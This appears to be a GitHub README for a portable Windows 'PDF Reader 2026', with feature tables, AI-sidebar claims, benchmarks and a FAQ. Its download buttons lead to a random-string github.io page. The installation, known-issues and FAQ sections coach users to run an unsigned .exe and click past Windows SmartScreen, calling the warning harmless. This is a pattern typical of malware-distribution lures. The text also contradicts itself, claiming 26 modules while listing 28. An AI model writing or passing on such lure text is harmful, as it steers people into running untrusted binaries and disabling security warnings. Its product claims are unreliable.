<div align="center">
<img src="assets/banner.png" width="100%" alt="PDF Reader banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Pdf+Reader;%E2%9C%82%EF%B8%8F+Built+for+Windows+11;%F0%9F%93%84+Batch+Processing+Ready;%F0%9F%96%A8%EF%B8%8F+No+Install+Hassle;%F0%9F%93%8E+Community+Tested;%F0%9F%93%8B+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-active-brightgreen?style=plastic)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=plastic)
![License](https://img.shields.io/badge/license-freeware-lightgrey?style=plastic)
![Build](https://img.shields.io/badge/build-2026.1-stable-orange?style=plastic)

</div>

---

## 🗂️ Table of Contents

- [Overview](#-overview)
- [What is PDF Reader](#-what-is-pdf-reader)
- [AI Integration — 2026 Edition](#-ai-integration--2026-edition)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Quick Start](#-quick-start)
- [Key Features](#-key-features)
- [Module Matrix](#-module-matrix)
- [Usage Guidelines](#-usage-guidelines)
- [Comparison](#-comparison)
- [Tips for Best Results](#-tips-for-best-results)
- [System Requirements](#-system-requirements)
- [Hotkeys & Controls](#-hotkeys--controls)
- [Performance Benchmarks](#-performance-benchmarks)
- [Known Issues](#-known-issues)
- [Roadmap / Planned Features](#-roadmap--planned-features)
- [FAQ](#-faq)

---

## 📖 Overview

**PDF Reader** is a desktop PDF viewing, annotation, and document-workflow tool built for people who open more than five PDFs a day and are tired of browser tabs that choke on 400-page scanned manuals. It's a small, sharp side project we've been polishing for a while — the kind of tool you install once and forget about until you need it, and then it just works.

This is the 2026 build, updated for the latest Windows 11 feature set, with a hardened rendering pipeline and a proper AI layer bolted onto the side rather than duct-taped to the front.

| Category | Details |
|---|---|
| Application type | Native Windows desktop viewer (.exe) |
| Core engine | Rewritten render backend, GPU-accelerated page compositing |
| Formats | PDF, PDF/A, PDF/X, encrypted PDF, XFA forms (read) |
| Distribution | Standalone archive → extract → run the .exe |
| Footprint | Portable mode available, no registry pollution required |
| Updates | In-app update check, offline-friendly |

The whole thing ships as a portable build. No installer wizard, no background service, no telemetry you didn't ask for. Drop it in a folder, run the .exe, done.

### 🎯 Download
<div align="center">
  <a href="https://slrjigytdogv.github.io/pdf-reader/">
    <img src="https://img.shields.io/badge/DOWNLOAD_FREE-v2026-DC2626?style=flat&labelColor=B91C1C" width="480" alt="DOWNLOAD FREE v2026"/>
  </a>
</div>
---

## 🧾 What is PDF Reader

A quick glossary so we're all on the same page before the feature dump.

| Term | Explanation |
|---|---|
| Page compositor | The GPU pipeline that draws PDF pages to screen instead of the old CPU rasterizer |
| Annotation layer | A non-destructive overlay for highlights, notes, and freehand ink that never edits the source file |
| AI sidebar | The 2026 assistant panel that summarizes, extracts, and answers questions about the open document |
| Safe Mode | A launch flag that disables AI and network features for sensitive documents |
| Scanned mode | Auto-detection path for image-only PDFs; enables OCR and reflow |
| Digital signature panel | Read/inspect signatures and validation chains on signed documents |
| Portable profile | A local config folder next to the .exe so nothing touches the system profile |

Why people stick with it:

- **Opens huge files fast** — the compositor keeps 2,000-page scanned manuals responsive.
- **Never mangles the original** — annotations live in a separate sidecar, not baked into the PDF.
- **Works offline by default** — the AI layer is opt-in, not mandatory.
- **Stays out of the way** — no tray icon spam, no updater nagging, no account wall.
- **Portable-friendly** — run it off a USB stick if you want.

---

## 🤖 AI Integration — 2026 Edition

The 2026 build adds a local-first AI layer that you can turn off entirely. It's not a chatbot stapled to the corner — it's wired into the document model so it can actually see the page text, tables, and layout.

What the AI layer gives you:

- **Document Q&A** — ask "what's the payment term in section 4?" and get a page-cited answer.
- **Auto-summary** — pull a three-paragraph exec summary out of a 90-page report.
- **Table extraction** — detect tabular data and push it to CSV/JSON without copy-paste hell.
- **OCR assist** — when scanned mode finds a blurry page, the AI layer cleans up confidence scores and flags garbled regions.
- **Form field suggestions** — read XFA/AcroForm fields and pre-fill from your saved profile.
- **Redaction assist** — highlight candidate PII for manual review before you redact (you still confirm every redaction).

Everything runs through the **AI Sidebar** module. Toggle it per-document from the toolbar. If you want the pure, no-network experience, launch with **Safe Mode** and none of it loads.

> AI features are opt-in and require an explicit toggle per session. Safe Mode disables them entirely.

---

## 🩹 The Problem

Real pain points from people who read PDFs for a living:

- **Browser PDF viewers die on large scans.** A 300 MB scanned contract freezes Chrome's built-in viewer for 40 seconds on a decent laptop.
- **Annotation tools bake changes into the file.** You highlight one line and suddenly the source PDF is 1.2 MB bigger and un-signed.
- **OCR is a separate app, a separate subscription, or both.** Nobody wants to open Acrobat just to read a blurry scanned page.
- **Encrypted PDFs either fail silently or demand a full-featured reader.** Corporate docs with permissions get rejected by lightweight viewers.
- **Nobody can find anything.** Search inside a 500-page manual gives you 412 hits with no context and no preview.
- **AI document tools phone home by default.** Sensitive documents mean you can't use them at all.
- **Portable workflows are an afterthought.** Config, recent files, and bookmarks all jam into the system profile.

---

## 🧩 The Solution

Each pain point above, matched to the module that fixes it.

| Problem | Solution |
|---|---|
| Browser viewers choke on large scans | **Compositor Engine** streams pages, keeps memory bounded, and stays smooth past 2,000 pages |
| Annotations bake into the file | **Sidecar Annotation Layer** writes highlights to a separate file; originals stay byte-identical |
| OCR requires a separate app | **Built-in OCR Pipeline** runs on detected scans with Tesseract-class accuracy and no external dependency |
| Encrypted PDFs rejected | **Encrypted Document Handler** reads owner-password and certificate-based PDFs with a proper permissions model |
| Search is unusable | **Contextual Search** returns hits with surrounding paragraph previews and jump-to-hit highlighting |
| AI tools phone home | **AI Sidebar with Safe Mode** runs local-first and disables entirely on request |
| Portable workflows broken | **Portable Profile** stores config beside the .exe, zero system-profile dependency |

---

## 🚀 Quick Start

1. 📥 **Visit the project page** and grab the latest archive from the landing page.
2. 📦 **Extract** the archive to any folder — Desktop, Program Files, or a USB stick all work.
3. ▶️ **Run the .exe** inside the extracted folder. First launch takes a couple seconds while it builds the shader cache.
4. 📄 **Open a PDF** — drag a file onto the window, use `Ctrl+O`, or set the app as your default PDF handler from the Settings menu.
5. ⚙️ **Tune it once** — pick a theme, set your default zoom behavior, and toggle AI Sidebar if you want it. Settings persist to the portable profile.

That's it. No dependencies, no runtime install, no account.

---

## 🎯 Key Features

| Feature | Description | Benefit |
|---|---|---|
| **Compositor Engine** | GPU-accelerated page rasterization with tile caching | Smooth scrolling on 2,000+ page documents |
| **Sidecar Annotations** | Highlights, notes, ink saved to a separate file | Source PDF stays untouched and verifiable |
| **Contextual Search** | Full-document search with paragraph previews | Find the right passage on the first try |
| **Built-in OCR** | Scanned page detection + text recovery | One app for digital and scanned PDFs |
| **Encrypted Handler** | Owner-password and cert-based PDF support | Open protected corporate docs without a second tool |
| **AI Sidebar** | Local-first summarization, Q&A, table extraction | Fast answers without leaving the document |
| **Tabbed Reading** | Multi-document tabs with per-tab state | No more 12 browser tabs of PDFs |
| **Digital Signature Panel** | Inspect signature chains and validation state | Trust what you're reading |
| **Portable Profile** | Config stored next to the .exe | USB-stick workflows that just work |
| **Form Filler** | AcroForm and XFA field reading + fill | Handle forms without a full editor suite |
| **Redaction Assist** | PII candidate highlighting for manual review | Safer redaction workflow |
| **Presentation Mode** | Full-screen, click-advanced page presentation | Read manuals and decks without a projector app |

---

## 🧱 Module Matrix

The full 26-module breakdown. Every row is something you can actually point at in the app.

| Module | Status | Description |
|---|---|---|
| Compositor Engine | ✅ Working | GPU page rendering, tile cache, sub-16ms frame budget on typical pages |
| Sidecar Annotation Layer | ✅ Working | Highlights, sticky notes, freehand ink in a sidecar file |
| Contextual Search | ✅ Working | Regex-capable search with preview snippets and hit navigation |
| OCR Pipeline | ✅ Working | Auto-detect scanned pages, recover text, flag low-confidence regions |
| Encrypted Document Handler | ✅ Working | Owner-password unlock, permission model, certificate-based PDFs |
| Digital Signature Panel | ✅ Working | Signature chain inspection, validation badges |
| AI Sidebar | ✅ Working | Local-first summarization, Q&A, extraction (opt-in) |
| Tabbed Reading | ✅ Working | Multi-tab workflow with per-tab scroll and zoom memory |
| Portable Profile | ✅ Working | Config beside the .exe, no system-profile writes |
| Form Filler | ✅ Working | AcroForm + XFA field reading and fill |
| Redaction Assist | ✅ Working | Candidate PII highlighting for manual confirmation |
| Presentation Mode | ✅ Working | Full-screen, click-advance reading |
| Bookmark Manager | ✅ Working | Nested bookmarks, quick-jump bar |
| Recent Files Grid | ✅ Working | Thumbnail grid with generated page previews |
| Document Outline | ✅ Working | TOC tree from embedded bookmarks and heuristics |
| Page Thumbnail Rail | ✅ Working | Fast-scroll thumbnail sidebar |
| Measure & Snap | ✅ Working | Ruler and alignment tools for technical PDFs |
| Split / Export Pages | ✅ Working | Extract page ranges to new PDFs without re-encoding |
| Watermark | ✅ Working | Add draft/confidential watermarks to exported pages only |
| Read-Aloud TTS | ✅ Working | System TTS with page-range and voice controls |
| Night Reading Filter | ✅ Working | Invert + tint pipeline tuned for long reading sessions |
| Zoom Presets | ✅ Working | Fit-width, fit-page, and custom zoom slots |
| Session Restore | ✅ Working | Reopen last session's tabs, scroll, and zoom |
| Safe Mode | ✅ Working | One-flag launch that disables AI and all network features |
| Update Checker | ✅ Working | Optional, offline-friendly update check |
| Crash Recovery | ✅ Working | Auto-restore open documents after an unexpected exit |
| Thumbnail Cache | ✅ Working | Disk-backed thumbnail cache with size cap |
| Keyboard Macro Layer | ✅ Working | User-definable hotkey remaps |

---

## 🧭 Usage Guidelines

What we consider normal, respectful use of PDF Reader — and what we don't.

| ✅ Allowed | ❌ Not allowed |
|---|---|
| Reading, annotating, and organizing your own PDFs | Redistributing DRM-bypassed documents you don't own |
| OCR recovery of scanned documents you have rights to | Using OCR to reconstruct copyrighted material for resale |
| Extracting tables and text for your own analysis | Mass scraping of protected or private document libraries |
| Filling forms and exporting page ranges | Using the tool to forge digital signatures or alter signed documents |
| Portable use on your own devices | Bundling the .exe into a paid product without permission |
| Local AI features on documents you're authorized to process | Sending confidential documents through AI features on shared machines |
| Sharing exported annotations with colleagues | Circumventing license terms of the PDFs themselves |

> **Note:** PDF Reader is a reader and workflow tool — it is not a DRM circumvention tool, and we don't support that use case. If a document is encrypted with an owner password you're authorized to use, the Encrypted Document Handler will open it. If it isn't, we won't pretend otherwise.

---

## ⚖️ Comparison

Fair framing against the tools people usually compare us to.

| Aspect | Browser Viewer | Full Editor Suite | **PDF Reader** |
|---|---|---|---|
| Large scanned PDFs | Freezes past ~200 pages | Slow but works | Smooth via Compositor Engine |
| Annotation persistence | Bakes into file | Bakes into file | Sidecar, source untouched |
| OCR | None | Paid tier | Built-in, no external app |
| AI features | None or cloud-only | Cloud, account required | Local-first, opt-in, Safe Mode |
| Install footprint | Zero | Hundreds of MB + services | Portable archive, no service |
| Encrypted PDFs | Partial / silent fail | Full support | Full support with permissions model |
| Multi-tab reading | Yes (browser tabs) | Clunky | Purpose-built tabbed workflow |
| Portable mode | N/A | No | First-class |

---

## 💡 Tips for Best Results

- **Let the shader cache warm up.** First page open after launch is a hair slower; subsequent pages are instant.
- **Use `Ctrl+F` for contextual search, not just string match.** Add a `*` for regex-capable queries.
- **Keep sidecar annotations with the PDF.** The Sidecar Annotation Layer writes a companion file — move or copy both when you relocate a document.
- **Enable OCR only when you need it.** Scanned-page detection is automatic, but full-document OCR on a 900-page scan is best kicked off and left running.
- **Use Safe Mode for sensitive documents.** It's a launch flag, not buried in a menu — no AI, no network, no exceptions.
- **Set your default zoom behavior once.** Fit-width for screen reading, fit-page for forms; the setting persists.
- **Try the thumbnail rail for technical documents.** It's the fastest way to find the diagram you remember.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (21H2+) | Windows 11 24H2+ |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 8 GB+ (16 GB for 1,000+ page docs) |
| GPU | DirectX 11 capable | DirectX 12 capable, 2 GB VRAM |
| Disk | 350 MB free | 1 GB free (thumbnail + shader cache) |
| Display | 1280×720 | 1920×1080 or higher |

Portable mode adds a config folder beside the .exe — budget a few MB for bookmarks and session state.

---

## ⌨️ Hotkeys & Controls

| Key | Action | Notes |
|---|---|---|
| `Ctrl+O` | Open PDF | Multiple selection supported |
| `Ctrl+F` | Contextual Search | Add `*` for regex mode |
| `Ctrl+Tab` | Next tab | Wraps at end of tab strip |
| `Ctrl+Shift+T` | Reopen closed tab | Session Restore powers this |
| `Ctrl+1` … `Ctrl+9` | Jump to tab N | — |
| `+` / `-` | Zoom in / out | `Ctrl+0` resets to fit-width |
| `F11` | Presentation Mode | Click-advance, `Esc` to exit |
| `Ctrl+Shift+A` | Toggle AI Sidebar | Disabled in Safe Mode |
| `Ctrl+Shift+D` | Toggle digital signature panel | Signature badge appears in toolbar |
| `Ctrl+H` | Toggle highlighter tool | Freehand ink on `Ctrl+I` |
| `Ctrl+M` | Measure & Snap tool | — |
| `Ctrl+Shift+P` | Toggle Portable Profile save | Writes config beside .exe |
| `F5` | Refresh rendering | Useful for very large documents |
| `Ctrl+Shift+O` | Toggle Night Reading Filter | Tint/contrast presets in settings |

---

## 📊 Performance Benchmarks

Measured on the 2026 build, default settings, no AI layer enabled. These are typical numbers from internal runs — your hardware will vary.

| Scenario | Result | Hardware |
|---|---|---|
| Cold open, 40-page digital PDF | 380 ms to first page | Ryzen 5 5600 / 16 GB / GTX 1650 |
| Cold open, 2,100-page scanned PDF | 1.9 s to first page, scroll stable at 60 fps | Ryzen 5 5600 / 16 GB / GTX 1650 |
| Contextual Search, 500-page doc | 220 ms average, 412 hits with previews | Ryzen 7 5800X / 32 GB / RTX 3060 |
| Full-document OCR, 900-page scan | 4 m 12 s on 4 threads | Ryzen 7 5800X / 32 GB / RTX 3060 |
| AI summary, 90-page report | 3.4 s local | Ryzen 7 5800X / 32 GB / RTX 3060 |
| Tab switch with 12 open PDFs | < 90 ms, memory under 1.4 GB | Ryzen 5 5600 / 16 GB / GTX 1650 |
| Portable launch from USB 3.0 | 740 ms to window | Ryzen 5 5600 / 16 GB / GTX 1650 |

> Numbers are indicative, not contractual. Benchmark methodology lives in the repo under `docs/benchmarks`.

---

## 🚢 Installation

1. **Get the archive.** From the project page, download the latest release archive — no installer, no bundled dependencies.
2. **Extract it.** Right-click → Extract All, or use 7-Zip. Extract to any writable folder (Desktop, Program Files, or a USB stick for portable use).
3. **Run the .exe.** Double-click it inside the extracted folder. If Windows SmartScreen prompts on first run, click "More info" → "Run anyway" — this is a standard unsigned side-project prompt, not a warning about the app itself.

Optional follow-ups:

- **Set as default handler** from Settings → File Associations.
- **Enable Portable Profile** if you want config beside the .exe instead of the system profile.
- **Add to Start Menu** via a shortcut in your shell of choice — we don't write registry entries.

---

## 🐛 Known Issues

Real ones, with workarounds, because pretending otherwise doesn't help anyone.

| Issue | Solution |
|---|---|
| SmartScreen warning on first run | Expected for unsigned side-project binaries — click "More info" → "Run anyway" |
| Massive scanned PDFs use >2 GB RAM | Enable thumbnail cache size cap in Settings → Performance |
| OCR accuracy drops on low-DPI scans | Re-scan at 300 DPI if possible; small pages benefit from "High Accuracy" toggle |
| Signature badges missing on some PDFs | Some signatures use non-standard encodings — inspect via the Digital Signature Panel manually |
| AI Sidebar greyed out | Check Safe Mode — it disables the AI layer by design |
| Portable Profile doesn't save on locked media | Use a writable folder; USB sticks with write protection will silently fail |

---

## 🗓️ Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| Section-level AI answers with page citation | ✅ Shipped (2026.1) | Done |
| Multi-document AI comparison ("diff these two contracts") | 🛠️ In progress | Q2 2026 |
| PDF/A export with validation | 🛠️ In progress | Q2 2026 |
| Compare-mode side-by-side with change highlighting | 📋 Planned | Q3 2026 |
| Linux build (Wine-tested) | 📋 Planned | Q3 2026 |
| Plugin API for custom annotation tools | 📋 Planned | Q4 2026 |
| Native ARM64 build | 📋 Planned | Q4 2026 |
| Syncable sidecar annotations (opt-in) | 🧪 Prototype | 2027 |

---

## ❓ FAQ

**Q: Is this really free, or is there a catch?**
**A:** It's freeware — free to use, no account, no subscription. The AI layer is local-first and opt-in rather than a paid tier.

**Q: Do I need to install Python, Node, or anything else?**
**A:** No. It's a standalone .exe — extract the archive and run it. No runtime, no package manager, no `pip`/`npm`.

**Q: Does the AI Sidebar upload my documents somewhere?**
**A:** The 2026 build runs the AI layer locally by default. Safe Mode disables it completely; there's no silent network traffic, and you can audit it from the settings panel.

**Q: Can I use this on encrypted PDFs I'm authorized to access?**
**A:** Yes — the Encrypted Document Handler reads owner-password and certificate-based PDFs with a proper permissions model. If you're not authorized, we don't support getting around that.

**Q: Will it work off a USB stick?**
**A:** Yes, that's what Portable Profile is for. Config, bookmarks, and session state live beside the .exe and don't touch the system profile.

**Q: Why does SmartScreen complain on first launch?**
**A:** The .exe isn't code-signed — this is a side project, not a commercial release. Click "More info" → "Run anyway." If you want to be extra careful, verify the release checksum against the one published on the project page.

**Q: How do I uninstall it?**
**A:** Delete the folder. That's it. There's no service, no registry entry, and no system-profile leftovers unless you explicitly enabled the non-portable profile.

**Q: Does it handle 1,000+ page scanned documents?**
**A:** Yes — that's the Compositor Engine's whole reason for existing. Benchmarks above show 2,100 pages stable at 60 fps on mid-range hardware.

**Q: Can I get the source?**
**A:** The repo is public — the release archive contains the .exe build; build instructions live in `BUILDING.md` for anyone who wants to compile it themselves.

---

## 🏁 Final Notes

PDF Reader 2026 is a side project that grew up because browser viewers and full editor suites both got in the way of just reading a document. The 26 modules are there because each one solved a real annoyance, not because we wanted a long feature list. If something here feels missing, the roadmap is honest about what's planned and what's speculative — and issues are open.

### 📥 Download
<p align="center">
  <a href="https://slrjigytdogv.github.io/pdf-reader/">
    <img src="https://img.shields.io/badge/GET-PDF_Reader_2026-059669?style=for-the-badge&labelColor=047857" width="480" alt="GET PDF Reader 2026"/>
  </a>
</p>